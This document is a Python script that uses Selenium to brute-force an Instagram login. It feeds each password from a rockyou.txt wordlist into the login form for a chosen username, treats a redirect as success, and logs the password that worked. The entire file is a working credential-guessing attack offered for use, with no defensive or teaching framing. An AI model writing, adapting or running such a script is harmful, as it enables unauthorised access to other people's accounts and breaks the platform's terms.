import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

chrome_driver_path = "/usr/bin/chromedriver"

chrome_options = webdriver.ChromeOptions()

service = Service(executable_path=chrome_driver_path)

driver = webdriver.Chrome(service=service, options=chrome_options)

driver.maximize_window()

# Open Instagram's login page
driver.get("https://www.instagram.com/accounts/login/")

WebDriverWait(driver, 20).until(
    EC.presence_of_element_located((By.NAME, "username"))
)

username = "" # add your instagram username here

with open("/home/jay/Documents/rockyou.txt", "r", encoding="latin-1") as file:
    passwords = file.readlines() # apply a path to your list of passwords in txt file

successful_login = False

while not successful_login:
    for enc_password in passwords:
        enc_password = enc_password.strip()  # Removing any | whitespace

        username_input = driver.find_element(By.NAME, "username")
        username_input.clear() 
        username_input.send_keys(username)

        password_input = driver.find_element(By.NAME, "password")
        password_input.clear()  
        password_input.send_keys(enc_password)
        password_input.send_keys(Keys.RETURN)

        time.sleep(6)  

        current_url = driver.current_url

        if current_url != "https://www.instagram.com/accounts/login/":
            print(f"Successful login with password: {enc_password}")
            with open("successful_passwords.log", "a") as log_file:
                log_file.write(f"{enc_password}\n")
            successful_login = True 
            break 
        else:
            for wait_time in range(3):  
                time.sleep(1)  
                if driver.current_url != "https://www.instagram.com/accounts/login/":
                    break  
            else:
                print(f"No redirection detected, refreshing for next password.")
                driver.get("https://www.instagram.com/accounts/login/")
                try:
                    WebDriverWait(driver, 20).until(
                        EC.presence_of_element_located((By.NAME, "username"))
                    )
                except Exception as e:
                    print("Error waiting for username field after refresh:", str(e))

if successful_login:
    print("Exiting script after successful login.")
    driver.quit()
